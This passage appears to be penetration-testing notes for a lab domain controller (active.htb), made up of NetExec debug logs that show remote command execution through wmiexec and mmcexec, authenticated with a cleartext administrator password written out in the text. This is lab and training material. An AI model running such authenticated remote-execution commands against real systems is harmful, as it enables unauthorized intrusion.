           DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.smb'>, type: <class 'type'>                                                                                                                                             netexec.py:145
           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/smb.db                                                                                                                                                        netexec.py:150
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.smb'>                                                                                                                                                                 netexec.py:48
           INFO     Socket info: host=10.129.175.223, hostname=10.129.175.223, kerberos=False, ipv6=False, link-local ipv6=False                                                                                           connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Creating SMBv3 connection to 10.129.175.223                                                                                                                                                                   smb.py:606
[10:34:57] DEBUG    Created connection object                                                                                                                                                                              connection.py:232
[10:34:58] DEBUG    Server OS: Windows 7 / Server 2008 R2 Build 7601 6.1 build 7601                                                                                                                                               smb.py:280
[10:34:59] INFO     Creating SMBv1 connection to 10.129.175.223                                                                                                                                                                   smb.py:575
[10:35:01] INFO     SMBv1 disabled on 10.129.175.223                                                                                                                                                                              smb.py:598
           DEBUG    Update Hosts: [{'id': 3, 'ip': '10.129.175.223', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601', 'dc': None, 'smbv1': False, 'signing': True, 'spooler': True,  database.py:265
                    'zerologon': None, 'petitpotam': None}]                                                                                                                                                                                 
           DEBUG    add_host() - Host IDs Updated: [3]                                                                                                                                                                       database.py:275
           INFO     Error resolving hostname active.htb: [Errno -2] Name or service not known                                                                                                                              connection.py:192
           INFO     Resolved domain: active.htb with dns, kdcHost: None                                                                                                                                                           smb.py:321
[10:35:01] INFO     SMB         10.129.175.223  445    DC               Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)                                                      smb.py:327
           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
           INFO     Creating SMBv3 connection to 10.129.175.223                                                                                                                                                                   smb.py:606
[10:35:03] DEBUG    Logged in with password to SMB with active.htb/administrator                                                                                                                                                  smb.py:468
           DEBUG    self.is_guest=False                                                                                                                                                                                           smb.py:470
           DEBUG    Checking if user is admin on 10.129.175.223                                                                                                                                                                   smb.py:646
[10:35:12] DEBUG    User is admin on 10.129.175.223!                                                                                                                                                                              smb.py:661
           DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                  smb.py:474
           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:332
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, True, None, None)]                                                         database.py:485
[10:35:12] INFO     SMB         10.129.175.223  445    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                        smb.py:481
           DEBUG    Adding admin user: active.htb/administrator:Ticketmaster1968@10.129.175.223                                                                                                                                   smb.py:486
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, True, None, None)]                                                         database.py:485
           DEBUG    users: <sqlalchemy.engine.cursor.CursorResult object at 0x7f5c9fb720b0>, hosts: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, True, None,       database.py:362
                    None)]                                                                                                                                                                                                                  
           DEBUG    Calling command arguments                                                                                                                                                                              connection.py:241
           DEBUG    Calling execute()                                                                                                                                                                                      connection.py:263
[10:35:21] INFO     Executed command via wmiexec                                                                                                                                                                                  smb.py:722
           DEBUG    Executing remote                                                                                                                                                                                          wmiexec.py:102
           DEBUG    Executing command: cmd.exe /Q /c whoami 1> \Windows\Temp\NieYEH 2>&1                                                                                                                                      wmiexec.py:115
[10:35:23] INFO     Attempting to read C$\\Windows\Temp\NieYEH                                                                                                                                                                wmiexec.py:148
[10:35:25] DEBUG    Deleting file C$\\Windows\Temp\NieYEH                                                                                                                                                                     wmiexec.py:177
[10:35:26] DEBUG    Raw Output: active\administrator                                                                                                                                                                              smb.py:817
                                                                                                                                                                                                                                            
           DEBUG    Cleaned Output: active\administrator                                                                                                                                                                          smb.py:819
[10:35:26] INFO     SMB         10.129.175.223  445    DC               Executed command via wmiexec                                                                                                                              smb.py:826
[10:35:26] INFO     SMB         10.129.175.223  445    DC               active\administrator                                                                                                                                      smb.py:829
           DEBUG    Closing connection to: 10.129.175.223                                                                                                                                                                  connection.py:178
```


### --exec-method 'mmcexec'
```sh
└─$ netexec smb 10.129.172.255 -u 'active.htb\administrator' -p 'Ticketmaster1968' --exec-method 'mmcexec' -x 'whoami' --debug
[23:39:33] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
           DEBUG    PYTHON VERSION: 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                    protocol='smb', target=['10.129.172.255'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                 
                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=None, module_options=[], list_modules=False, show_module_options=False, hash=[], delegate=None, no_s4u2proxy=False,              
                    domain=None, local_auth=False, port=445, share='C$', smb_server_port=445, no_smbv1=False, gen_relay_list=None, smb_timeout=2, laps=None, generate_hosts_file=None, generate_krb5_file=None, sam=None,                   
                    lsa=None, ntds=None, dpapi=None, sccm=None, mkfile=None, pvk=None, enabled=False, userntds=None, shares=False, dir=None, interfaces=False, no_write_check=False, filter_shares=None, smb_sessions=False,                
                    disks=False, loggedon_users_filter=None, loggedon_users=None, users=None, users_export=None, groups=None, computers=None, local_groups=None, pass_pol=False, rid_brute=None, qwinsta=False,                             
                    tasklist=False, wmi=None, wmi_namespace='root\\cimv2', spider=None, spider_folder='.', content=False, exclude_dirs='', depth=None, only_files=False, pattern=None, regex=None, put_file=None,                           
                    get_file=None, append_host=False, exec_method='mmcexec', dcom_timeout=5, get_output_tries=100, codec='utf-8', no_output=False, execute='whoami', ps_execute=None, obfs=False, amsi_bypass=None,                         
                    clear_obfscripts=False, force_ps32=False, no_encode=False, exec_method_explicitly_set=True)                                                                                                                             
           DEBUG    Protocol: smb                                                                                                                                                                                             netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/smb.py                                                                                                                                        netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/smb/database.py                                                                                                                            netexec.py:142
           DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.smb'>, type: <class 'type'>                                                                                                                                             netexec.py:145
           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/smb.db                                                                                                                                                        netexec.py:150
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.smb'>                                                                                                                                                                 netexec.py:48
           INFO     Socket info: host=10.129.172.255, hostname=10.129.172.255, kerberos=False, ipv6=False, link-local ipv6=False                                                                                           connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Creating SMBv3 connection to 10.129.172.255                                                                                                                                                                   smb.py:606
[23:39:35] DEBUG    Created connection object                                                                                                                                                                              connection.py:232
           DEBUG    Server OS: Windows 7 / Server 2008 R2 Build 7601 6.1 build 7601                                                                                                                                               smb.py:280
[23:39:37] INFO     Creating SMBv1 connection to 10.129.172.255                                                                                                                                                                   smb.py:575
[23:39:39] INFO     SMBv1 disabled on 10.129.172.255                                                                                                                                                                              smb.py:598
           DEBUG    Update Hosts: [{'id': 4, 'ip': '10.129.172.255', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601', 'dc': None, 'smbv1': False, 'signing': True, 'spooler': None,  database.py:265
                    'zerologon': None, 'petitpotam': None}]                                                                                                                                                                                 
           DEBUG    add_host() - Host IDs Updated: [4]                                                                                                                                                                       database.py:275
           INFO     Error resolving hostname active.htb: [Errno -2] Name or service not known                                                                                                                              connection.py:192
           INFO     Resolved domain: active.htb with dns, kdcHost: None                                                                                                                                                           smb.py:321
[23:39:39] INFO     SMB         10.129.172.255  445    DC               Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)                                                      smb.py:327
           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
           INFO     Creating SMBv3 connection to 10.129.172.255                                                                                                                                                                   smb.py:606
[23:39:41] DEBUG    Logged in with password to SMB with active.htb/administrator                                                                                                                                                  smb.py:468
           DEBUG    self.is_guest=False                                                                                                                                                                                           smb.py:470
           DEBUG    Checking if user is admin on 10.129.172.255                                                                                                                                                                   smb.py:646
[23:39:51] DEBUG    User is admin on 10.129.172.255!                                                                                                                                                                              smb.py:661
           DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                  smb.py:474
           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:332
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.172.255                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(4, '10.129.172.255', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
[23:39:51] INFO     SMB         10.129.172.255  445    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                        smb.py:481
           DEBUG    Adding admin user: active.htb/administrator:Ticketmaster1968@10.129.172.255                                                                                                                                   smb.py:486
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.172.255                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(4, '10.129.172.255', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
           DEBUG    users: <sqlalchemy.engine.cursor.CursorResult object at 0x7fcea8a160b0>, hosts: [(4, '10.129.172.255', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None,       database.py:362
                    None)]                                                                                                                                                                                                                  
           DEBUG    Calling command arguments                                                                                                                                                                              connection.py:241
           DEBUG    Calling execute()                                                                                                                                                                                      connection.py:263
[23:39:59] INFO     Executed command via mmcexec                                                                                                                                                                                  smb.py:750
[23:40:00] INFO     Attempting to read C$\\Windows\Temp\GTmPMK                                                                                                                                                                mmcexec.py:257
[23:40:02] DEBUG    Deleting file C$\\Windows\Temp\GTmPMK                                                                                                                                                                     mmcexec.py:286
[23:40:04] DEBUG    Raw Output: active\administrator                                                                                                                                                                              smb.py:817
                                                                                                                                                                                                                                            
           DEBUG    Cleaned Output: active\administrator                                                                                                                                                                          smb.py:819
[23:40:04] INFO     SMB         10.129.172.255  445    DC               Executed command via mmcexec                                                                                                                              smb.py:826
[23:40:04] INFO     SMB         10.129.172.255  445    DC               active\administrator                                                                                                                                      smb.py:829
           DEBUG    Closing connection to: 10.129.172.255                                                                                                                                                                  connection.py:178
```
